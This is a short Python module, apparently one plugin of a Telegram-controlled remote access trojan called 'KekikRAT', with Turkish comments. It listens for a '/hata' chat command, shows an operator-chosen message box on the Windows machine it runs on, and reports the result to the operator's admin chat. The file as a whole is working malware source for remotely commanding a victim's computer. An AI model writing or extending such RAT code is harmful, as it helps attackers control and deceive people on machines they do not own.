#!/usr/bin/env python
#! -*- coding: utf-8 -*-
# Bu araç @keyiflerolsun tarafından | @KekikAkademi için yazılmıştır.

from pyrogram import Client, Filters
from KekikRAT import adminID
import ctypes

@Client.on_message(Filters.command(['hata'], ['!','.','/']))
def hata(client, message):
    message.reply_chat_action("typing")
    kekik = client.send_message(adminID, "Bekleyin..")

    mesaj = f"[{message.from_user.first_name}](tg://user?id={message.from_user.id}) | `hata` Komutunu Verdi!\n\n"

    girilenYazi = message.text
    if len(girilenYazi.split()) == 1:
        kekik.edit("`Hata Metni` Girmelisiniz")
        return

    hataMetni = " ".join(girilenYazi.split()[1:])
    try:
        kekik.edit("Gönderdim!")
        ctypes.windll.user32.MessageBoxW(None, hataMetni, 'Bilgilendirme', 0x40)
        mesaj += f"Onayladı: `{hataMetni}`"
    except Exception as olumsuz:
        mesaj = olumsuz

    kekik.edit(mesaj)